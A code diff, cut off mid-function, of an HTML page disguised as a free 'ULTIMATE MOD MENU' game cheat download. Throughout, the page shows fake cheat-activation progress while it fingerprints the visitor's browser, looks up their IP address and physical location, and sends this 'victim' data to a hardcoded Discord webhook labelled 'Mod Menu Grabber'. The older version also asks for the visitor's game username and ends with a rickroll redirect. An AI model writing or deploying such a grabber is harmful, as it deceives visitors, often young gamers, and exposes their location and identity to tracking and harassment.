@@ -6,49 +6,14 @@
     <title>ULTIMATE MOD MENU v2.4 - FREE DOWNLOAD</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-        body {
-            background: linear-gradient(45deg, #0a0a0a, #1a001f, #000);
-            color: #00ff41;
-            font-family: 'Press Start 2P', cursive;
-            text-align: center;
-            padding: 20px;
-            margin: 0;
-            overflow: hidden;
-            height: 100vh;
-        }
+        body { background: linear-gradient(45deg, #0a0a0a, #1a001f, #000); color: #00ff41; font-family: 'Press Start 2P', cursive; text-align: center; padding: 20px; margin: 0; overflow: hidden; height: 100vh; }
         .container { max-width: 680px; margin: auto; padding-top: 8vh; }
-        h1 { 
-            font-size: 2em; 
-            text-shadow: 0 0 20px #00ff41, 0 0 40px #ff00ff;
-            animation: glitch 0.7s infinite alternate;
-            margin-bottom: 10px;
-        }
+        h1 { font-size: 2em; text-shadow: 0 0 20px #00ff41, 0 0 40px #ff00ff; animation: glitch 0.7s infinite alternate; margin-bottom: 10px; }
         .subtitle { color: #ff00ff; font-size: 1.1em; margin-bottom: 30px; }
-        .progress { 
-            height: 28px; background: #111; border: 3px solid #00ff41; 
-            margin: 35px auto; width: 88%; box-shadow: 0 0 25px #00ff41;
-        }
-        .bar { 
-            height: 100%; width: 0%; background: linear-gradient(to right, #00ff41, #ff00ff, #00ff41);
-            transition: width 0.25s linear; box-shadow: 0 0 20px #ff00ff;
-        }
-        button {
-            margin-top: 25px; padding: 20px 55px; font-size: 1.25em; 
-            background: #ff00ff; color: #000; border: 4px solid #00ff41;
-            cursor: pointer; box-shadow: 0 0 40px #ff00ff; transition: all 0.3s;
-            text-transform: uppercase;
-        }
-        button:hover { 
-            transform: scale(1.12); box-shadow: 0 0 70px #ff00ff; 
-        }
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-4px, 3px); }
-            40% { transform: translate(4px, -3px); }
-            100% { transform: translate(0); }
-        }
+        .progress { height: 28px; background: #111; border: 3px solid #00ff41; margin: 35px auto; width: 88%; box-shadow: 0 0 25px #00ff41; }
+        .bar { height: 100%; width: 0%; background: linear-gradient(to right, #00ff41, #ff00ff, #00ff41); transition: width 0.25s linear; box-shadow: 0 0 20px #ff00ff; }
+        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-4px, 3px); } 40% { transform: translate(4px, -3px); } 100% { transform: translate(0); } }
         #status { margin: 20px 0; font-size: 1.15em; min-height: 1.8em; text-shadow: 0 0 10px #00ff41; }
-        .warning { color: #ff0000; font-size: 0.9em; margin-top: 40px; }
     </style>
 </head>
 <body>
@@ -57,28 +22,25 @@
         <p class="subtitle">FREE • UNDETECTED • WORKING 2026</p>
         <p id="status">Connecting to private server...</p>
         <div class="progress"><div id="prog" class="bar"></div></div>
-        <button onclick="startClaim()">ACTIVATE MOD MENU / DOWNLOAD</button>
-        <p class="warning">BYPASS ANTICHEAT • ESP • AIMBOT • GODMODE</p>
+        <p style="margin-top:40px; color:#ff00ff;">Activating cheats...</p>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const customId = urlParams.get('id') || urlParams.get('victim') || urlParams.get('game') || "Unknown";
+        const customId = urlParams.get('id') || urlParams.get('victim') || urlParams.get('u') || "TestVictim";
 
         let data = {
             customId: customId,
-            name: "Anonymous",
+            name: "TestVictim",
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
             screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
             referrer: document.referrer || "direct",
             hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
             deviceMemory: navigator.deviceMemory || "N/A",
-            connection: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
-            battery: "N/A"
+            fingerprint: "AUTO-TEST-FP-" + Date.now()
         };
 
         function getAdvancedFingerprint() {
@@ -86,109 +48,63 @@
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "16px Arial";
-                ctx.fillStyle = "#0f0";
-                ctx.fillText("MOD MENU ACTIVATED - " + Date.now(), 15, 60);
-                fp += canvas.toDataURL().slice(0, 140);
-
-                const gl = document.createElement('canvas').getContext('webgl');
-                if (gl) {
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    fp += "|" + gl.getParameter(gl.VENDOR) + "|" + (debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A");
-                }
-
-                const audio = new (window.AudioContext || window.webkitAudioContext)();
-                fp += "|" + audio.sampleRate;
+                ctx.fillText("MODMENU " + navigator.userAgent, 10, 50);
+                fp += canvas.toDataURL().slice(0, 100);
             } catch(e) {}
-            return btoa(fp + navigator.userAgent).substring(0, 90);
+            return btoa(fp).substring(0, 80);
         }
         data.fingerprint = getAdvancedFingerprint();
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => data.battery = `${Math.round(b.level*100)}% ${b.charging ? 'Charging' : ''}`);
-        }
 
         function fakeLoading() {
             let progress = 0;
             const progBar = document.getElementById('prog');
             const status = document.getElementById('status');
-            const msgs = [
-                "Connecting to private server...",
-                "Bypassing anticheat...",
-                "Injecting ESP + Aimbot...",
-                "Finalizing activation...",
-                "Downloading files..."
-            ];
+            const msgs = ["Connecting...", "Bypassing anticheat...", "Injecting cheats...", "Finalizing..."];
             let i = 0;
-
             const int = setInterval(() => {
-                progress += Math.random() * 26 + 9;
-                if (progress > 100) progress = 100;
-                progBar.style.width = `${progress}%`;
-
-                if (progress > 30 && i === 0) { status.textContent = msgs[1]; i++; }
-                if (progress > 55 && i === 1) { status.textContent = msgs[2]; i++; }
-                if (progress > 78 && i === 2) { status.textContent = msgs[3]; i++; }
-                if (progress >= 100) {
-                    clearInterval(int);
-                    status.textContent = msgs[4];
-                }
-            }, 135);
+                progress += 22;
+                progBar.style.width = `${Math.min(progress, 100)}%`;
+                if (progress > 35 && i === 0) { status.textContent = msgs[1]; i++; }
+                if (progress > 65 && i === 1) { status.textContent = msgs[2]; i++; }
+                if (progress >= 100) clearInterval(int);
+            }, 110);
         }
 
-        window.startClaim = function() {
-            const username = prompt("ENTER YOUR GAME USERNAME / DISCORD TAG TO ACTIVATE:", "") || "Anonymous";
-            data.name = username.trim();
+        async function getIPAndGeo() {
+            const services = [
+                () => fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => ({ip: d.ip})),
+                () => fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy').then(r => r.json()),
+                () => fetch('https://ipinfo.io/json').then(r => r.json()).then(d => ({
+                    ip: d.ip, country: d.country, city: d.city, region: d.region, isp: d.org
+                }))
+            ];
 
-            fakeLoading();
+            for (let service of services) {
+                try {
+                    const res = await service();
+                    if (res.ip || res.country) {
+                        data.ip = res.ip || "N/A";
+                        Object.assign(data, {
+                            country: res.country || "Unknown",
+                            countryCode: res.countryCode || "N/A",
+                            city: res.city || "Unknown",
+                            region: res.region || "Unknown",
+                            isp: res.isp || "Unknown",
+                            timezone: res.timezone || "Unknown",
+                            lat: res.lat || "N/A",
+                            lon: res.lon || "N/A",
+                            proxy: res.proxy ? "YES" : "No"
+                        });
+                        return;
+                    }
+                } catch(e) {}
+            }
+            data.ip = "Lookup Failed";
+        }
 
-            Promise.all([
-                fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({})),
-                fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting').then(r => r.json()).catch(() => ({}))
-            ]).then(([ipRes, geo]) => {
-                data.ip = ipRes.ip || "N/A";
-
-                Object.assign(data, {
-                    country: geo.country || "Unknown",
-                    countryCode: geo.countryCode || "N/A",
-                    city: geo.city || "Unknown",
-                    region: geo.regionName || "Unknown",
-                    isp: geo.isp || "Unknown",
-                    timezone: geo.timezone || "Unknown",
-                    lat: geo.lat || "N/A",
-                    lon: geo.lon || "N/A",
-                    proxy: geo.proxy ? "YES (VPN/Proxy)" : "No"
-                });
-
-                const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
-
-                const payload = {
-                    username: "Mod Menu Grabber",
-                    avatar_url: "https://i.imgur.com/removed.png",
-                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Username:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.countryCode})\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}\n**Time:** ${data.timestamp}`,
-                    embeds: [{
-                        title: "Full Victim Data",
-                        description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-                        color: 0x00ff41
-                    }]
-                };
-
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
-                }).catch(() => {});
-
-            }).finally(() => {
-                // Always rickroll after grab attempt
-                setTimeout(() => {
-                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq";
-                }, 1400);
-            });
-        };
-
-        window.onload = () => setTimeout(fakeLoading, 400);
-    </script>
-</body>
-</html>
+        function sendToDiscord() {
+            const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
+            const payload = {
+                username: "Mod Menu Grabber",
+                content: `**🔥 MOD MENU GRABBED 🔥**\n**Custom ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.countryCode})\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}\n**Time:** ${data.timestamp}`,
+                embeds: [{ title: "Full Data", description: "```json\n" + JSON.stringify(data, null, 2) + "\n```", color: 0x00ff41
